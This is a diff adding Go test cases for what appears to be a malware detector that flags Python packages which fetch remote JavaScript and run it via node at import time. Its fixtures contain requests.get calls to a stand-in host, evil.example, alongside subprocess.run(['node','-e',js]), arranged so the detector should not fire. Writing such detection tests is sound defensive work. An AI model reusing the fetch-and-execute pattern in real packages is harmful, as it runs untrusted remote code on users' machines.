@@ -155,6 +155,41 @@ subprocess.run(["node", "build.js"])`,
 	}
 }
 
+func TestFlowSensitivity(t *testing.T) {
+	cases := []struct{ name, src string }{
+		{
+			"sink before the fetch",
+			`import requests, subprocess
+subprocess.run(["node", "-e", js])
+js = requests.get("https://evil.example/p.js").text`,
+		},
+		{
+			"tainted var overwritten by a safe literal before the sink",
+			`import requests, subprocess
+js = requests.get("https://evil.example/p.js").text
+js = "console.log('safe')"
+subprocess.run(["node", "-e", js])`,
+		},
+		{
+			"same name in a different function, safe value at the sink",
+			`import requests, subprocess
+def fetch_asset():
+    js = requests.get("https://evil.example/p.js").text
+def build():
+    js = "console.log('safe')"
+    subprocess.run(["node", "-e", js])
+build()`,
+		},
+	}
+	for _, c := range cases {
+		t.Run(c.name, func(t *testing.T) {
+			if fires(t, "__init__.py", c.src) {
+				t.Fatalf("flow-sensitive analysis must NOT fire: the executed value does not trace back to the fetch")
+			}
+		})
+	}
+}
+
 func TestPrecisionOnlyTargetFiles(t *testing.T) {
 	// The exact malicious shape in a non-target file must not fire: the
 	// analyzer only inspects install/import-time entry points.
